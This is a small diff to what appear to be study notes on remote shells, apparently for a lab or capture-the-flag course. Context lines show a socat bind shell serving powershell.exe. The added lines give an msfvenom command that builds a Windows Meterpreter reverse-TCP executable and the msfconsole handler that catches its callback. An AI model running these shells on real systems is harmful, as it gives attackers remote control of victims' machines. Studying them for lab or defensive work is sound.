@@ -1078,5 +1078,17 @@ p9 (socat bind shell windows)
 - ``` socat TCP-L:4444EXEC:powershell.exe,pipes ``` target`s
 - ``` socat TCP:<target-ip>:4444- ``` attacker`s
 
-p10
+p10 Create a 64bit Windows Meterpreter shell using msfvenom
+- create shell
+- ``` msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=<tun0-ip> LPORT=4444 ```
+- start a listener
 - 
+``` 
+msfconsole
+use multi/handler
+set LHOST=<tun0-ip> ,
+set LPORT=4444
+set payload windows/x64/meterpreter/reverse_tcp
+run 
+```
+
